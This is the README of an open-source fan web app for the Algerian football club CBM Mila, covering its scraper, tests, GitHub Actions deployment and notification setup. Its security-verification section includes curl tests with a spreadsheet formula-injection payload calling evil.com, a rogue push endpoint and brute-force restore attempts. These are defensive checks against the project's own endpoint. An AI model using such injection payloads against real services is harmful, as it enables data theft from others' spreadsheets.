# CBM Mila 1936 · شباب بلدية ميلة 🔴⚪

Official open-source Progressive Web App (PWA) for supporters of **Chabab Baladiat Mila (CBM 1936 — Club ID `733`)**, competing in the Algerian **Ligue Inter-Régions — Group East (`شرق`, `seasonId: 6`, `competitionId: 4275`)**.

- **Live App:** [https://cbm-mila.github.io/CBM-MILA-DIGITAL-PLATFORM/](https://cbm-mila.github.io/CBM-MILA-DIGITAL-PLATFORM/)
- **Source Data:** [Ligue Inter-Régions de Football (lirf.dz)](https://www.lirf.dz/ar/ranking)

## Architecture & Data Flow

```text
+-------------------------------------------------------------------+
|                   https://www.lirf.dz (Arabic)                    |
|     /ar/ranking  •  /ar/calendar  •  /ar/club/733  •  /ar/match   |
+-------------------------------------------------------------------+
                                  |
                                  | Polite HTTP (ETag / If-Modified-Since, ~1 req/s, GET-only retry)
                                  v
+-------------------------------------------------------------------+
|              scraper.py (GitHub Actions: update-data.yml)         |
|  • Competition pinning (season 2026/2027, group شرق, 16-club set) |
|  • Header-based table parser & explicit penalty model             |
|  • Match state machine (scheduled/live/finished/postponed/forfeit)|
|  • Sanity checks + JSON Schema validation (data/schema.json)      |
|  • Notification QUEUE in status.json, delivered after the push    |
|  • Parallel Web Push (10 workers), per-channel sent markers      |
+-------------------------------------------------------------------+
        |                                         |
        | git commit & push (cbm-bot)             | POST (ADMIN_KEY / VAPID)
        v                                         v
+-------------------------------+   +-------------------------------+
|   GitHub Pages Static Host    |   |  Telegram Bot + Code.gs API   |
|  • data/data.json (Single SoT)|   |  • Digital Supporter Cards    |
|  • index.html / app.js / sw.js|   |  • Web Push Subscriptions     |
+-------------------------------+   +-------------------------------+
        |                                         |
        +--------------------+--------------------+
                             |
                             v
+-------------------------------------------------------------------+
|          Supporter PWA (Arabic / French / English, RTL)           |
|  • sw.js: Network-first for shell + data, SWR for images/fonts    |
|  • Match-day 60s live polling, countdown, stale-data banner       |
+-------------------------------------------------------------------+
```

## Running the Scraper & Tests Locally

1. **Install dependencies:**
   ```bash
   python3 -m venv .venv
   source .venv/bin/activate
   pip install -r requirements.txt
   ```

2. **Preview changes against live `lirf.dz` without modifying files (`--dry-run`):**
   ```bash
   python scraper.py --dry-run --verbose
   ```

3. **Allow a legitimate league correction if `played` decreases once (`--accept-regression`):**
   ```bash
   python scraper.py --accept-regression --verbose
   ```

4. **Run against saved HTML fixtures (offline test mode):**
   ```bash
   python scraper.py --dry-run --fixture-dir tests/fixtures
   ```

5. **Run the automated test suite & schema/syntax checks:**
   ```bash
   pytest -v
   python -m py_compile scraper.py scripts/notify_failure.py
   node --check app.js
   node --check sw.js
   node --check config.js
   ```

## Refreshing HTML Test Fixtures (`tests/fixtures/`)

The HTML files in `tests/fixtures/` mirror the real markup published by `https://www.lirf.dz` (no synthetic CSS classes). To refresh them when LIRF updates its template:

```bash
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/ranking" -o tests/fixtures/ranking.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/" -o tests/fixtures/calendar.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/club/733" -o tests/fixtures/club_733.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/match/226410" -o tests/fixtures/match_226410_finished.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/match/226424" -o tests/fixtures/match_226424_mismatched.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/statistics" -o tests/fixtures/statistics.html
pytest -v
```

## Automated Data Updates and GitHub Pages Deployment

For the non-programmer installation procedure, see [AUTOMATION-SETUP-AR.md](AUTOMATION-SETUP-AR.md).

- The **single active data-update workflow** is `.github/workflows/update-data.yml`. Keep automated workflows inside `.github/workflows/`; files with similar names elsewhere in the repository are not GitHub Actions workflows.
- The workflow validates `data/data.json` against `data/schema.json` and the last published dataset before pushing. It commits `data/data.json` together with `data/status.json`, then delivers queued notifications, and finally saves notification-delivery state.
- Commits use no `[skip ci]`, and because a push made with `GITHUB_TOKEN` does not automatically trigger a Pages build, the workflow explicitly requests a Pages rebuild after `data/data.json` changes. If that request fails, the update and notification steps are allowed to finish; check GitHub → **Actions** → **pages-build-deployment** (or **Deployments → github-pages**) for the deployment status.
- To verify the published data without a browser cache, open a terminal and run:
  ```bash
  curl -s "https://cbm-mila.github.io/CBM-MILA-DIGITAL-PLATFORM/data/data.json?ts=$(date +%s)" | head -n 5
  ```
- The workflow refreshes `lastUpdated` on a successful no-change check (default: after about 6 hours), so the repository receives a small heartbeat commit periodically. It requests `contents: write` to publish validated files and `pages: write` to request the public-site rebuild.

## Rolling Over to a New Season

Season parameters are read dynamically from `data/data.json` under `sourceMeta` and `club` — no code changes in `scraper.py` or `app.js` are required:

1. Update `data/data.json` -> `sourceMeta`:
   - `seasonId`: new LIRF season identifier (e.g. `"7"`)
   - `seasonName`: new season label (e.g. `"2027/2028"`)
   - `competitionId`: group ID (e.g. `"4275"` for Group East)
   - `competitionAr`: Arabic group name (`"شرق"`)
2. Update `opponents` and initial `matches` / `standings` for the new season's 16 clubs.
3. Run `python scraper.py --dry-run --verbose` to verify against `lirf.dz`.

## Manual Owner Checklist (Required One-Time Setup)

### 1. Confirm the Active Workflow and Repository Permissions
This cleaned project package already keeps the active workflow at `.github/workflows/update-data.yml` and removes the inactive duplicate workflow copies. Do not add a second scheduled update workflow, or the scraper may run more than once per schedule window.

If GitHub Actions reports that it cannot push a commit, open the repository's **Settings → Actions → General → Workflow permissions**. Allow workflow-specific permissions or select **Read and write permissions**, then save. The workflow requests `contents: write` and `pages: write`—the latter is used only to request a Pages rebuild after the published data changes.

### 2. Google Apps Script Deployment (`Code.gs` v8 — compatible with the existing sheet layout, no data migration)
1. Open your Google Sheet → **Extensions → Apps Script**.
2. Replace the contents of `Code.gs` with the updated `Code.gs` file from this repository and click **Save (💾)**.
3. Click **Project Settings (⚙️)** on the left sidebar → scroll to **Script Properties** → ensure property `ADMIN_KEY` is set to a strong secret string.
4. Click **Deploy → Manage deployments** (top right) → click the **Edit (✏️)** icon on your active Web App deployment → under **Version**, select **New version** → click **Deploy**. *(Note: saving `Code.gs` without creating a **New version** under Manage deployments leaves the live `/exec` endpoint running old code!)*

### 3. GitHub Actions Repository Secrets (`Settings → Secrets and variables → Actions`)

| Secret Name | Purpose |
| :--- | :--- |
| `TELEGRAM_BOT_TOKEN` | Bot token from `@BotFather` for match result, kickoff, and failure alerts |
| `TELEGRAM_CHAT_ID` | Target Telegram channel/group chat ID |
| `ADMIN_KEY` | Shared secret matching `ADMIN_KEY` in Google Apps Script Properties |
| `REGISTRY_URL` | Deployed Google Apps Script Web App `/exec` URL |
| `VAPID_PRIVATE_KEY` | VAPID private key matching `self.CBM_VAPID_PUBLIC_KEY` in `config.js` |

### 4. Verifying `Code.gs` Security & Rate Limits via `curl`
Replace `EXEC_URL` with your Google Apps Script `/exec` URL:
```bash
EXEC_URL="https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec"

# 1) Formula injection attempt -> leading = + - @ characters are stripped from the stored name
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"register","name":"=IMPORTXML(\"https://evil.com\",\"//a\")","dev":"dev-test-1","lang":"ar"}'

# 2) Disallowed push endpoint -> rejected with {"ok":false,"code":"invalid_subscription"}
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"push_sub","dev":"dev-test-1","sub":{"endpoint":"https://evil.example.com/push","keys":{"p256dh":"BOr...","auth":"xyz..."}}}'

# 3) Family member registering a second card with a different name on the same phone -> succeeds (max 3 new cards / 15 min per device)
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"register","name":"بلعريبي سعيد","dev":"family-phone-1","lang":"ar"}'
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"register","name":"بلعريبي ياسين","dev":"family-phone-1","lang":"ar"}'

# 4) 6 failed restore attempts on a card -> 6th returns {"ok":false,"code":"rate_limit"}
for i in 1 2 3 4 5 6; do
  curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
    -d '{"v":2,"a":"restore","name":"Wrong Name","supporterId":"CBM-123456","dev":"attacker-dev-'$i'"}'
  echo ""
done

# 5) Public verify lookup -> read-only, returns maskedName; limited to 60 req / 15 min per dev (requests without dev: global ceiling of 1500 only)
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"verify","supporterId":"CBM-123456","dev":"scanner-dev-1"}'
```

## Notification Delivery (exactly-once-ish)

1. `python scraper.py --verbose --defer-notifications` updates `data/data.json` and only **queues** events in `data/status.json` (`queuedNotifications`).
2. The workflow commits and pushes both files.
3. `python scraper.py --notify-queued` sends Telegram + Web Push **after** the push succeeded, using per-channel `sent` markers, then clears the queue (an event is retried at most 3 times).
4. A final small commit stores the delivery state, so the next run never re-sends the same event.

If step 2 fails, nothing was sent and the next run simply re-detects the change. Running `python scraper.py` without flags still sends immediately (local use).

## Styling

`style-additions.css` contains only the new rules (sync bar, status badges, noscript banner; dark + light). Append it to the end of your existing `style.css`; do not replace the file.

## Telegram Messages

Default mode (`TELEGRAM_MODE=digest`): **one rich message per run** describing every net change since the committed data
(CBM result + scorers, new/changed kickoff & venue, closed doors, standings moves, other results of the round, top scorers, squad),
with inline buttons (platform / table / matches / squad). Set `TELEGRAM_MODE=events` for the legacy one-message-per-event mode.

When nothing changed, a friendly "😴 لا جديد حالياً" message (CBM rank + countdown to the next match) is sent at most every
`NO_NEWS_EVERY_HOURS` hours (default `6`; `0` = every run, `-1` = never). Set it as a repository **variable**
(`Settings → Secrets and variables → Actions → Variables`). Manual runs (**Run workflow**, `always_report=true`) always reply.
